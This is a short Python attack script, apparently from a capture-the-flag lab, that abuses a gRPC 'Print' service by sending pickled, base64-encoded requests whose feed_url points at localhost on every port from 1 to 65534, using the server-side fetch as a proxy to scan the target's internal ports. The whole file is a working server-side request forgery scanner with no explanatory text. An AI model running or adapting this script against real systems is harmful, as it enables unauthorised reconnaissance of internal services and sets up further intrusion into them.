import grpc
import base64, pickle
import sys
import laser_pb2
import laser_pb2_grpc

print("Checking for open ports")

for port in range(1, 65535):

    # open a gRPC channel
    channel = grpc.insecure_channel('10.10.10.201:9000')
    print("Checking for port {}".format(port))
    sys.stdout.flush()


    # create a stub (client)
    stub = laser_pb2_grpc.PrintStub(channel)
    data = '{"feed_url": "http://localhost:' + str(port) + '"}'
    data = base64.b64encode(pickle.dumps(data))

    # create a valid request message
    content = laser_pb2.Content(data=data)
    try:
        response = stub.Feed(content)
        print("open, {}".format(response))
    except Exception as ex:
        if 'Connection refused' in str(ex):
            continue
        else:
            print("Port {} open".format(port))